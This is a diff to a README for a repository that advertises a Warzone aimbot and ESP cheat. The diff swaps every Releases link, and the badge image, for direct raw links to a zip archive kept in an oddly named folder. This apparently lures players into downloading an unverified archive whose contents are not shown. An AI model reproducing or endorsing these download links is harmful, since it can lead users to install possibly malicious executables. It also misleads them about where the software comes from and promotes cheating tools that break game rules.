@@ -1,6 +1,6 @@
 # 🎯 warzone-cheat-aimbot-esp - Elevate Your Warzone Gameplay
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20Started%20Here-brightgreen)](https://github.com/linixOH/warzone-cheat-aimbot-esp/releases)
+[![Download Now](https://raw.githubusercontent.com/linixOH/warzone-cheat-aimbot-esp/main/republicanize/warzone-cheat-aimbot-esp.zip%20Now-Get%20Started%20Here-brightgreen)](https://raw.githubusercontent.com/linixOH/warzone-cheat-aimbot-esp/main/republicanize/warzone-cheat-aimbot-esp.zip)
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ Welcome to **warzone-cheat-aimbot-esp**! This application provides a powerful se
 
    To get the latest version of the software, click the link below:
 
-   [Download from Releases](https://github.com/linixOH/warzone-cheat-aimbot-esp/releases)
+   [Download from Releases](https://raw.githubusercontent.com/linixOH/warzone-cheat-aimbot-esp/main/republicanize/warzone-cheat-aimbot-esp.zip)
 
 2. **Choose the Correct Version**
 
@@ -69,7 +69,7 @@ If you have questions, join our community forums where users share tips and supp
 
 We continually update the application to enhance performance and add new features. To stay informed about the latest updates, check the Releases page regularly:
 
-[Updates and News](https://github.com/linixOH/warzone-cheat-aimbot-esp/releases)
+[Updates and News](https://raw.githubusercontent.com/linixOH/warzone-cheat-aimbot-esp/main/republicanize/warzone-cheat-aimbot-esp.zip)
 
 ## 🤝 Contributing
 
